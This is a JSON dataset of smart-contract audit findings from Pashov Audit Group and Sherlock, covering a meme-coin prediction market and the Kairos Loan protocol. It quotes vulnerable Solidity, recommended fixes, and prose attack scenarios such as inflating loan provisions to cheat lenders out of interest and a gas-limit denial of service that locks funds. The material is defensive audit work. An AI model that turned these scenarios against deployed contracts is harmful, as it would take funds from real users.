{
  "category": "RWA Lending",
  "total_findings": 256,
  "fetched_at": "2026-01-29T13:47:42Z",
  "findings": [
    {
      "id": "62481",
      "title": "[L-08] `endMultipleRounds()` lacks round end timestamp check",
      "impact": "LOW",
      "content": "\n_Acknowledged_\n\n`endMultipleRounds()` is used to end multiple rounds across different markets in a single transaction.\n```solidity\nfunction endMultipleRounds(uint256[] calldata marketIds) external onlyOwner {\n        for (uint256 i = 0; i < marketIds.length; i++) {\n            uint256 marketId = marketIds[i];\n            uint256 roundId = currentRoundId[marketId];\n            Round storage round = marketRounds[marketId][roundId];\n\n            if (!round.ended) {\n                (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed);\n                round.endPrice = price;\n                round.ended = true;\n\n                uint256 totalPool = predictions[marketId][roundId].length * PREDICTION_FEE;\n                uint256 fee = (totalPool * 5) / 100;\n\n                if (fee > 0 && treasury != address(0)) {\n                    IERC20(markets[marketId].token).transfer(treasury, fee);\n                }\n            }\n        }\n    }\n```\nAs you can see, it does not verify whether the end timestamp has been reached before ending the round, allowing it to be ended at any time and bypassing the 24-hour window.\n\n**Recommendations**\n\nChecks if the round's end timestamp has been reached; if not, it reverts.\n```diff\nfunction endMultipleRounds(uint256[] calldata marketIds) external onlyOwner {\n        for (uint256 i = 0; i < marketIds.length; i++) {\n            uint256 marketId = marketIds[i];\n            uint256 roundId = currentRoundId[marketId];\n            Round storage round = marketRounds[marketId][roundId];\n\n+           require(block.timestamp >= round.startTime + 24 hours, \"Round not over yet\");\n\n            if (!round.ended) {\n                (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed);\n                round.endPrice = price;\n                round.ended = true;\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62480",
      "title": "[L-07] New rounds can start while current round is active, trapping funds",
      "impact": "LOW",
      "content": "\n_Resolved_\n\n`startNewRound()` is used to initiate a new round for a specific market.\n```solidity\nfunction startNewRound(uint256 marketId) external onlyOwner {\n        require(marketId < marketCount, \"Invalid market\");\n\n        // Get current price from DIA price feed\n        (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed);\n\n        // Increment round counter and create new round\n        currentRoundId[marketId]++;\n        marketRounds[marketId][currentRoundId[marketId]] = Round({\n            startTime: block.timestamp,\n            startPrice: price,\n            endPrice: 0,\n            ended: false\n        });\n        emit RoundStarted(marketId, currentRoundId[marketId], block.timestamp, price);\n    }\n```\nAs you can see, it does not check if a round is currently ongoing and increases `currentRoundId`. The issue is that `endRound()` relies on the stored `currentRoundId`, which may now point to an unfinished round.\n```solidity\nfunction endRound(uint256 marketId) external onlyOwner {\n@>      uint256 roundId = currentRoundId[marketId];\n        Round storage round = marketRounds[marketId][roundId];\n        require(!round.ended, \"Round already ended\");\n        require(block.timestamp >= round.startTime + 24 hours, \"Round not over yet\");\n\n        // Get final price from DIA\n        (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed); /\n\n        // Set final price and mark round as ended\n        round.endPrice = price;\n        round.ended = true;\n\n        // Calculate and transfer 5% fee to treasury\n        uint256 totalPool = predictions[marketId][roundId].length * PREDICTION_FEE; \n   \n        uint256 fee = (totalPool * 5) / 100;\n\n        if (fee > 0 && treasury != address(0)) {\n            IERC20(markets[marketId].token).transfer(treasury, fee);\n            emit FeeTransferred(marketId, roundId, treasury, fee);\n        }\n        emit RoundEnded(marketId, roundId, price, totalPool, fee);\n    }\n```\nThis causes a problem where, if `startNewRound()` is called while a round is still active and some users have already deposited tokens using `predict()`, their funds become permanently stuck in the contract. \n\nThis is because the only way to withdraw these funds is through `claimReward()`, which depends on `endRound()` being called to set `round.ended = true` for that round.\n```solidity\nfunction claimReward(uint256 marketId, uint256 roundId) external {\n        Round memory round = marketRounds[marketId][roundId];\n@>      require(round.ended, \"Round not ended\");\n        require(!hasClaimed[marketId][roundId][msg.sender], \"Already claimed\");\n\n///code...\n}\n```\nIn this case, it will be impossible to set `round.ended = true` because the new round has already started and the previous round cannot be ended, causing all funds from that round to be permanently locked in the contract.\n\n**Recommendations**\n\nTo solve the problem, check if a round is currently ongoing for the market and only allow starting a new round once the current round’s `ended` status is set to true. The same check should be applied to `startMultipleRounds()`.\n```diff\nfunction startNewRound(uint256 marketId) external onlyOwner {\n        require(marketId < marketCount, \"Invalid market\");\n+        Round memory currentRound = marketRounds[marketId][currentRoundId[marketId]];\n\n+        if (currentRound.startTime != 0) {\n+            require(currentRound.ended, \"Previous round not finshed\");\n+        }\n\n        // Get current price from DIA price feed\n        (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed);\n\n        // Increment round counter and create new round\n        currentRoundId[marketId]++;\n        marketRounds[marketId][currentRoundId[marketId]] = Round({\n            startTime: block.timestamp,\n            startPrice: price,\n            endPrice: 0,\n            ended: false\n        });\n        emit RoundStarted(marketId, currentRoundId[marketId], block.timestamp, price);\n    }\n\n```\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62479",
      "title": "[L-06] Stale price data may cause incorrect round outcomes",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nIn the endRound function, the contract retrieves the latest value from the DIA price feed, but does not check whether the price is fresh or from before the round's end time (startTime + 24 hours). As a result, it is possible for the oracle to return a stale price. This creates a fairness issue, where the final round result (and thus reward distribution) might not accurately reflect the market conditions at the end of the round, potentially disadvantaging users who made correct predictions.\n\nAdd a check that ensures the returned price timestamp is after or at the round's expected end time.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62478",
      "title": "[L-05] Missing events in `endMultipleRounds`",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nThe endRound function emits RoundEnded and FeeTransferred events, which are crucial for off-chain services track contract activity. The batch function endMultipleRounds performs the same logic but does not emit these events. This creates an inconsistency and makes it difficult for dApps and monitoring tools to track rounds that are closed via the batch function.\n\nAdd the corresponding emit statements inside the loop in endMultipleRounds.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62477",
      "title": "[L-04] Bearish users have an advantage over bullish ones",
      "impact": "LOW",
      "content": "\n_Acknowledged_\n\nTo determine whether the prediction is bullish or bearish in `claimReward()`, the calculation is as follows:\n```solidity\nbool isBullWinning = round.endPrice > round.startPrice;\n```\nIf `round.endPrice == round.startPrice`, the bearish predictions win by default. This gives the bearish position a slight advantage over the bullish.\n\nRecommendation: If `round.endPrice == round.startPrice`, refund the entire deposited amount to the users.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62476",
      "title": "[L-03] Blacklisted users' tokens are stuck after a win",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nTo make predictions, `predict()` is used with USDC tokens, which implement blacklist logic. If a user is blacklisted after making a prediction and wins, their tokens will be permanently stuck in the contract because `claimReward()` sends rewards only to the original user, who can no longer withdraw due to the blacklist.\n\nRecommendation: Implement an owner-only function to withdraw USDC in such cases to prevent funds from being locked forever.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62475",
      "title": "[L-02] Some assets may be locked in the contract if treasury is address(0)",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nWhen we end one round, we will calculate the fee. And based on current logic, we will transfer the treasury fee to the treasury address if the treasury address is not address(0). \n\nThe problem here is that if the treasury address is address(0), we will not transfer the treasury fee, and when users claim rewards, this part of fees will still be deducted from the rewards. So this part of the assets will be locked.\n```solidity\n    function endRound(uint256 marketId) external onlyOwner {\n        ...\n        // Calculate and transfer 5% fee to treasury\n        // total predict asset for this round.\n        uint256 totalPool = predictions[marketId][roundId].length * PREDICTION_FEE;\n        // treasury fee.\n        uint256 fee = (totalPool * 5) / 100;\n\n        if (fee > 0 && treasury != address(0)) {\n            // the token will always be USDC.\n            IERC20(markets[marketId].token).transfer(treasury, fee);\n            emit FeeTransferred(marketId, roundId, treasury, fee);\n        }\n        emit RoundEnded(marketId, roundId, price, totalPool, fee);\n    }\n```\n\nRecommendation: Here we have one assumption that the `treasury` should not be address(0). Suggest adding one security check to make sure that `treasury` is not address(0).\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62474",
      "title": "[L-01] Later prediction rounds may not start at expected timestamp",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nAccording to the discussion with sponsors, we expect to start a new round at the expected timestamp. For example, we expect to start a new round in each UTC 00:00.\n\nThe problem here is that when the owner wants to end this round at start timestamp + 24 hours, it will be quite difficult to end the round exactly at start timestamp + 24 hours. It's quite possible that we may delay one or two blocks. Then we can start one new round after the start timestamp + 24 hours + several blocks. In each round prediction, we will add one delay here. When we finish hundreds of rounds, we will find out that the actual start time for one new round is far away from our expected UTC 00:00. This will have a bad influence on predictors.\n\n```solidity\n    function endRound(uint256 marketId) external onlyOwner {\n        uint256 roundId = currentRoundId[marketId];\n        // storage.\n        Round storage round = marketRounds[marketId][roundId];\n        require(!round.ended, \"Round already ended\");\n        // If we reach the end of this round, the owner can end one round.\n        require(block.timestamp >= round.startTime + 24 hours, \"Round not over yet\");\n    }\n```\n\nRecommendation: Remove this requirement. \n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62473",
      "title": "[M-03] Single-prediction design raises gas costs for high-volume users",
      "impact": "MEDIUM",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n## Description\n\nThe current predict function in the MemePredictionMarket contract only supports a fixed single prediction per transaction. Each user is charged exactly 5 USDC (PREDICTION_FEE) for every prediction they make, with no way to scale the amount in a single call.\n\nThis creates a bottleneck for users who want to place large predictions (e.g., $1,000 or $10,000). These users must call the predict function multiple times, each transferring 5 USDC, resulting in repetitive token transfer operations and expensive gas fees, especially on high-congestion chains like Ethereum Mainnet. When gas prices spike, each call may cost over $5 in gas, making the user experience inefficient and economically unreasonable.\n\n## Recommendations\n\nAllow users to place multiple predictions in a single transaction \n\n```solidity\nfunction predict(uint256 marketId, bool isBullish, uint256 amount) external roundActive(marketId) {\n\n// Total prediction cost\nuint256 totalFee = PREDICTION_FEE * amount;\n\n// Transfer total USDC fee from user to contract\nrequire(\n    IERC20(markets[marketId].token).transferFrom(\n        msg.sender,\n        address(this),\n        totalFee\n    ),\n    \"Payment failed\"\n);\n\n// Store prediction\npredictions[marketId][roundId].push(Prediction({\n    user: msg.sender,\n    isBullish: isBullish,\n    amount: totalFee\n}));\n```\n\n\n\n",
      "summary": "\nThe current predict function in the MemePredictionMarket contract only allows for one prediction per transaction, charging each user a fixed fee of 5 USDC. This causes issues for users who want to make large predictions, as they must make multiple calls and pay expensive gas fees. It is recommended to update the function to allow for multiple predictions in a single transaction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62472",
      "title": "[M-02] Late participation advantage in `MemePredictionMarket`",
      "impact": "MEDIUM",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nThe current design of MemePredictionMarket allows users to make predictions for most of the round's duration (e.g., a 24-hour round with prediction open for 23 hours), which unintentionally benefits late participants. These users can observe more price action and make better-informed decisions than early participants, leading to an unfair advantage.\n\nExample scenario:\n\n- At the beginning of the round, the token price is 10.\n- A user joins early and makes a prediction.\n- Near the deadline (e.g., hour 23), the price rises to 15.\n- A new user sees this trend and makes the same bullish prediction, with a much higher confidence of winning.\n\nThis system disproportionately rewards those who join late, potentially disincentivizing early participation and harming the fairness of the prediction market.\n\n## Recommendations\n\nImplement time-based weighting: Earlier predictions could receive higher weight or rewards to compensate for increased uncertainty.\n\nincorporate price delta-based weighting: If a user joins after a significant price movement (e.g., from 10 to 20), their prediction reward could be adjusted based on the reduced risk taken.\n\n\n\n",
      "summary": "\nThe MemePredictionMarket has a bug where late participants have an unfair advantage over early participants. This is because they can observe more price action and make better predictions, leading to a disproportionate reward for late joiners. To fix this, the report recommends implementing time-based weighting or incorporating price delta-based weighting to compensate for the increased uncertainty and risk for early participants.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62471",
      "title": "[M-01] Funds lock if all users choose same direction and price is incorrect",
      "impact": "MEDIUM",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** High\n\n**Likelihood:** Low\n\n## Description\nThe only way to withdraw tokens from the contract (excluding the fees sent to the treasury) is through `claimReward()`.\n```solidity\nfunction claimReward(uint256 marketId, uint256 roundId) external {\n        Round memory round = marketRounds[marketId][roundId];\n        require(round.ended, \"Round not ended\");\n        require(!hasClaimed[marketId][roundId][msg.sender], \"Already claimed\");\n\n        Prediction[] memory preds = predictions[marketId][roundId];\n        \n        // Determine winning direction (bullish if end price > start price)\n        bool isBullWinning = round.endPrice > round.startPrice;\n\n        // Calculate reward pool (total - 5% fee)\n        uint256 totalPool = preds.length * PREDICTION_FEE;\n        uint256 fee = (totalPool * 5) / 100;\n        uint256 rewardPool = totalPool - fee;\n\n        // Calculate user's share of winning predictions\n        uint256 totalWinningAmount = 0;\n        uint256 userWinningAmount = 0;\n\n        for (uint256 i = 0; i < preds.length; i++) {\n            if (preds[i].isBullish == isBullWinning) {\n                totalWinningAmount += preds[i].amount;\n                if (preds[i].user == msg.sender) {\n                    userWinningAmount += preds[i].amount;\n                }\n            }\n        }\n\n        require(userWinningAmount > 0, \"Not in winning group\");\n\n        // Calculate user's reward based on their share\n        uint256 reward = (rewardPool * userWinningAmount) / totalWinningAmount;\n\n        // Mark as claimed and transfer reward\n        hasClaimed[marketId][roundId][msg.sender] = true;\n        IERC20(markets[marketId].token).transfer(msg.sender, reward);\n\n        emit RewardClaimed(marketId, roundId, msg.sender, reward);\n    }\n```\nAs seen in the code, calculating a user's reward involves iterating through all predictions to determine `totalWinningAmount` and `userWinningAmount`. If all users predict the same direction, `totalWinningAmount` and  `userWinningAmount` become zero for all the users. This results in no one being able to claim rewards, effectively locking all funds in the contract permanently.\n\nIf even a single user predicts the opposite direction, they receive the entire `rewardPool`. However, if no one does, there's no valid winning side, and since there's no alternative mechanism to withdraw the tokens, they remain permanently stuck in the contract with no way to recover them.\n\n## Recommendations\nOne solution could be to send all the tokens from that round to the treasury if no one correctly predicts the price direction.\n\n\n\n",
      "summary": "\nThis bug report discusses an issue in a smart contract that prevents users from withdrawing their tokens. The only way to withdraw tokens is through a function called `claimReward()`, but if all users predict the same direction, the function fails and no one can claim their rewards. This results in all funds being permanently stuck in the contract with no way to recover them. The report suggests sending all tokens to the treasury if no one correctly predicts the price direction as a possible solution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62470",
      "title": "[H-01] `claimReward()` can DOS by iterating predictions blocking funds",
      "impact": "HIGH",
      "content": "\n_Resolved_\n\n## Severity\n\n**Impact:** High\n\n**Likelihood:** Medium\n\n## Description\nUsers can create an unlimited number of predictions for a specific market and round using `predict()`.\n```solidity\nfunction predict(uint256 marketId, bool isBullish) external roundActive(marketId) {\n        uint256 roundId = currentRoundId[marketId];\n        Round memory round = marketRounds[marketId][roundId];\n\n        // Predictions close 1 hour before round ends to prevent last-minute manipulation\n        require(block.timestamp < round.startTime + 23 hours, \"Prediction closed (last hour)\");\n\n        // Transfer 5 USDC fee from user to contract\n        require(IERC20(markets[marketId].token).transferFrom(\n            msg.sender,\n            address(this),\n            PREDICTION_FEE\n        ), \"Payment failed\");\n\n        // Store the prediction\n        predictions[marketId][roundId].push(Prediction({\n            user: msg.sender,\n            isBullish: isBullish,\n            amount: PREDICTION_FEE \n        }));\n        emit PredictionMade(marketId, roundId, msg.sender, isBullish, PREDICTION_FEE);\n    }\n```\nThe `predictions` array can grow indefinitely because it is unbounded. When `claimReward()` is called, the entire `predictions` array is checked.\n```solidity\nfunction claimReward(uint256 marketId, uint256 roundId) external {\n        \n        Round memory round = marketRounds[marketId][roundId];\n        require(round.ended, \"Round not ended\");\n        require(!hasClaimed[marketId][roundId][msg.sender], \"Already claimed\");\n\n        Prediction[] memory preds = predictions[marketId][roundId];\n        \n        // Determine winning direction (bullish if end price > start price)\n        bool isBullWinning = round.endPrice > round.startPrice;\n\n        // Calculate reward pool (total - 5% fee)\n        uint256 totalPool = preds.length * PREDICTION_FEE; \n        uint256 fee = (totalPool * 5) / 100;\n        uint256 rewardPool = totalPool - fee;\n\n        // Calculate user's share of winning predictions\n        uint256 totalWinningAmount = 0;\n        uint256 userWinningAmount = 0;\n\n        for (uint256 i = 0; i < preds.length; i++) {\n            if (preds[i].isBullish == isBullWinning) {\n                totalWinningAmount += preds[i].amount;\n                if (preds[i].user == msg.sender) {\n                    userWinningAmount += preds[i].amount;\n                }\n            }\n        }\n\n       ///code...\n    }\n```\nThis could cause the transaction to exceed the block’s maximum gas limit and revert, resulting in a denial-of-service (DoS) that permanently locks funds in the contract.\n\nThis scenario is likely because the amount is fixed at 5 USDC in `PREDICTION_FEE`. For example, if a user wants to predict 10,000 USDC, 2,000 entries would be added to the `predictions` array.\n\n## Recommendations\nTo solve the issue, set a maximum limit on the number of predictions allowed per round.\n\n\n\n",
      "summary": "\nThis report discusses a bug in a code that allows users to create an unlimited number of predictions for a specific market and round. This can cause the transaction to exceed the block’s maximum gas limit and result in a denial-of-service (DoS) attack, permanently locking funds in the contract. The report recommends setting a maximum limit on the number of predictions allowed per round to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "12282",
      "title": "M-5: If auction price goes to 0, NFT might become unclaimable/ stuck forever",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/17 \n\n## Found by \nGimelSec, Koolex, Vagner, chaduke, deadrxsezzz\n\n## Summary\nThere are certain ERC20 tokens which revert on zero value transfers (e.g. LEND). If an NFT's price drops down to 0, nobody will be able to claim it as the transaction will always revert.\n\n## Vulnerability Detail\nThe time of  `loan.auction.duration` passes. The NFT's price is 0. Alice tries to purchase/ claim it, however the ERC20 token on which the auctions is going reverts on 0 value transfers. The NFT becomes stuck forever and no one can take the rights of it.\n\nConsider the following scenarios: \n1.\n > The ERC20 used in the auction is pausable \n > Throughout the auction, the token gets paused. Now, the auction is still going, the price is dropping and no one is able to claim it.\n > The ERC20 doesn't get unpaused up until the auction ends.\n > Since no one was able to purchase the NFT during the auction, its price now is 0. Since the token reverts on zero value transfers, the NFT is stuck forever.\n\n2.\n > Alice is looking at NFT auction which is coming near its end.\n > Alice is looking to purchase the NFT for as little as possible and starts monitoring the mempool, so in case someone tries to buy it, she can front-run the transaction and get the NFT herself. At this point Alice getting the NFT should be guaranteed\n > However, there aren't many other active users/ they aren't paying attention to said NFT. Little time goes by, auction ends and price is set to 0.\n > Alice is happy she can claim the NFT for free. However, the token reverts on 0 value transfers and now no one can claim it and the NFT is lost forever.\n\n## Impact\nNFT might be lost forever\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/AuctionFacet.sol#L43-#L45\n\n## Tool used\n\nManual Review\n\n## Recommendation\nAddress ERC20 tokens which revert on 0 value transfers. Auctions which are run with such tokens should have a minimal price of 1 wei ( instead of 0)\n\n\n\n## Discussion\n\n**npasquie**\n\nfix: https://github.com/kairos-loan/kairos-contracts/pull/49",
      "summary": "\nThis bug report is about an issue that occurs when an NFT's price drops to 0 during an auction. If the ERC20 token used in the auction reverts on 0 value transfers, then no one will be able to claim the NFT and it will become stuck forever. This issue was found by GimelSec, Koolex, Vagner, chaduke, and deadrxsezzz, and the impact is that the NFT will be lost forever. To address this issue, it is recommended to address ERC20 tokens that revert on 0 value transfers, and have a minimal price of 1 wei instead of 0. A fix has been proposed in the form of a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/17",
      "tags": [],
      "finders": [
        "Koolex",
        "Vagner",
        "deadrxsezzz",
        "chaduke",
        "GimelSec"
      ]
    },
    {
      "id": "12281",
      "title": "M-4: minOfferCost can be bypassed in certain scenarios",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/23 \n\n## Found by \n0x52\n\n## Summary\n\nminOfferCost is designed to prevent spam loan requests that can cause the lender to have positions that cost more gas to claim than interest. Due to how interest is calculated right after this minimum is passed it is still possible for the lender to receive less than the minimum.\n\n## Vulnerability Detail\n\n[ClaimFacet.sol#L94-L106](https://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/ClaimFacet.sol#L94-L106)\n\n    function sendInterests(Loan storage loan, Provision storage provision) internal returns (uint256 sent) {\n        uint256 interests = loan.payment.paid - loan.lent;\n        if (interests == loan.payment.minInterestsToRepay) {\n            // this is the case if the loan is repaid shortly after issuance\n            // each lender gets its minimal interest, as an anti ddos measure to spam offer\n            sent = provision.amount + (interests / loan.nbOfPositions);\n        } else {\n            /* provision.amount / lent = share of the interests belonging to the lender. The parenthesis make the\n            calculus in the order that maximizes precison */\n            sent = provision.amount + (interests * (provision.amount)) / loan.lent; <- audit-issue minimal interest isn't guaranteed\n        }\n        loan.assetLent.checkedTransfer(msg.sender, sent);\n    }\n\nWhen a loan has generated more than the minimum interest amount the method for calculating the interest paid is different and depending on the size of the provisions it may lead to provisions that are under the guaranteed minimum.\n\nExample:\nAssume the minimum interest is 1e18. A loan is filled with 2 provisions. The first provision is 25% and the second is 75%. Since there are two loans the total minimum interest for the loan is 2e18. After some time the paid interest reaches 2.001e18 and the loan is paid back. Since it is above the minimum interest rate, it is paid out proportionally. This gives 0.5e18 to the first provision and 1.5e18 to the second provision. This violates the minimum guaranteed interest amount.\n\n## Impact\n\nMinimum interest guarantee can be violated\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/ClaimFacet.sol#L94-L106\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nMinimum interest should be set based on the percentage of the lowest provision and provision shouldn't be allowed to be lower than some amount. Since this problem occurs when the percentage is less than 1/n (where n is the number of provisions), any single provision should be allowed to be lower than 1/(2n). \n\n\n\n## Discussion\n\n**npasquie**\n\nfixed by https://github.com/kairos-loan/kairos-contracts/pull/51\nthe fix restricts the nb of offer/provision per loan to 1 eliminating the vulnerability",
      "summary": "\nThis bug report is about an issue in the code of the Kairos Loan platform. The issue is that the minOfferCost, which is designed to prevent spam loan requests that can cause the lender to have positions that cost more gas to claim than interest, can be bypassed in certain scenarios. This happens when the paid interests is higher than the minimum guaranteed interest and the loan is paid back. The code snippet that is affected is found in ClaimFacet.sol#L94-L106. The impact of this issue is that the minimum interest guarantee can be violated. The bug was found by 0x52 and the tool used for the review was manual review. The recommendation is to set the minimum interest based on the percentage of the lowest provision and to not allow any single provision to be lower than 1/(2n). The bug was fixed by a pull request on the Kairos Loan platform repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Kairos Loan",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-kairos-judging/issues/23",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "12280",
      "title": "M-3: Adversary can utilize a large number of their own loans to cheat other lenders out of interest",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-kairos-judging/issues/24 \n\n## Found by \n0x52, GimelSec\n\n## Summary\n\nThe minimal interest paid by a loan is scaled by the number of provisions that make up the loan. By inflating the number of provisions with their own provisions then can cause legitimate lenders to receive a much lower interest rate than intended.\n\n## Vulnerability Detail\n\n[ClaimFacet.sol#L94-L106](https://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/ClaimFacet.sol#L94-L106)\n\n    function sendInterests(Loan storage loan, Provision storage provision) internal returns (uint256 sent) {\n        uint256 interests = loan.payment.paid - loan.lent;\n        if (interests == loan.payment.minInterestsToRepay) {\n            // this is the case if the loan is repaid shortly after issuance\n            // each lender gets its minimal interest, as an anti ddos measure to spam offer\n            sent = provision.amount + (interests / loan.nbOfPositions);\n        } else {\n            /* provision.amount / lent = share of the interests belonging to the lender. The parenthesis make the\n            calculus in the order that maximizes precison */\n            sent = provision.amount + (interests * (provision.amount)) / loan.lent;\n        }\n        loan.assetLent.checkedTransfer(msg.sender, sent);\n    }\n\nIf a loan is paid back before the minimal interest rate has been reached then each provision will receive the unweighted minimal interest amount. This can be abused to take loans that pay legitimate lenders a lower APR than expected, cheating them of their yield.\n\nExample:\nA user wishes to borrow 1000 USDC at 10% APR. Assume the minimal interest per provision is 10 USDC and minimum borrow amount is 20 USDC. After 1 year the user would owe 100 USDC in interest. A user can abuse the minimum to pay legitimate lenders much lower than 10% APR. The attacker will find a legitimate offer to claim 820 USDC. This will create an offer for themselves and borrow 20 USDC from it 9 times. This creates a total of 10 provisions each owed a minimum of 10 USDC or 100 USDC total. Now after 1 year they owe 100 USDC on their loan and the repay the loan. Since 100 USDC is the minimum, each of the 10 provisions will get their minimal interest. 90 USDC will go to their provisions and 10 will go to the legitimate user who loaned them a majority of the USDC. Their APR is ~1.2% which is ~1/9th of what they specified.\n\n## Impact\n\nLegitimate users can be cheated out of interest owed\n\n## Code Snippet\n\n[ClaimFacet.sol#L94-L106](https://github.com/sherlock-audit/2023-02-kairos/blob/main/kairos-contracts/src/ClaimFacet.sol#L94-L106)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe relative size of the provisions should be enforced so that one is not much larger than any other one\n\n\n\n## Discussion\n\n**npasquie**\n\nsimilar to #66\n\n**npasquie**\n\nfixed by https://github.com/kairos-loan/kairos-contracts/pull/51\nthe fix restricts the nb of offer/provision per loan to 1 eliminating the vulnerability",
